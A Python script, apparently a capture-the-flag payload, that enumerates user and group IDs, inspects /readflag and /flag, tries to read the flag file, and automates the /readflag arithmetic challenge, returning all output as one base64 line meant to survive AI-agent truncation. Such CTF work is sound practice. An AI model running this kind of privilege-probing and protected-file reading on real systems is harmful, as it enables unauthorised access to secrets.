#!/usr/bin/env python3
import base64
import os
import re
import subprocess
import sys


EXPR_RE = re.compile(r"^\([0-9+\-()]+\)$")


def _safe_eval(expr: str) -> int:
    expr = expr.strip()
    if not EXPR_RE.fullmatch(expr):
        raise ValueError(f"unexpected expression: {expr!r}")
    return int(eval(expr, {"__builtins__": {}}, {}))


def _result_b64(data: bytes) -> None:
    # One line to survive Codex truncation; decode client-side.
    b64 = base64.b64encode(data).decode("ascii")
    sys.stdout.write("RESULT_B64: " + b64 + "\n")


def cmd_out(*cmd: str) -> bytes:
    try:
        return subprocess.check_output(list(cmd), stderr=subprocess.STDOUT)
    except Exception as e:
        return f"[cmd error] {cmd}: {type(e).__name__}: {e}\n".encode()


def run_readflag() -> bytes:
    p = subprocess.Popen(
        ["/readflag"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0,
    )
    if p.stdin is None or p.stdout is None:
        return b"spawn error\n"

    buf = ""
    while True:
        ch = p.stdout.read(1)
        if ch == "":
            break
        buf += ch
        if "input your answer:" in buf:
            break

    m = re.search(r"\n(\([0-9+\-()]+\))\s*\ninput your answer:", buf)
    if not m:
        return (buf + "\nprotocol error (no expr)\n").encode("utf-8", errors="replace")

    ans = _safe_eval(m.group(1))
    p.stdin.write(str(ans) + "\n")
    p.stdin.flush()

    out = buf + p.stdout.read()
    return out.encode("utf-8", errors="replace")


def main() -> int:
    report = bytearray()
    report += f"uid={os.getuid()} euid={os.geteuid()} gid={os.getgid()} egid={os.getegid()}\n".encode()
    report += b"--- id ---\n"
    report += cmd_out("id")
    report += b"--- ls -l /readflag /flag ---\n"
    report += cmd_out("ls", "-l", "/readflag", "/flag")
    report += b"--- stat /readflag /flag ---\n"
    report += cmd_out("stat", "/readflag", "/flag")

    report += b"--- try read /flag ---\n"
    try:
        flag_bytes = open("/flag", "rb").read()
        report += b"FLAG_LEN: " + str(len(flag_bytes)).encode() + b"\n"
        report += b"FLAG_B64: " + base64.b64encode(flag_bytes) + b"\n"
    except Exception as e:
        report += f"FLAG_READ_ERR: {type(e).__name__}: {e}\n".encode()

    report += b"--- /readflag output ---\n"
    report += run_readflag()

    _result_b64(bytes(report))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

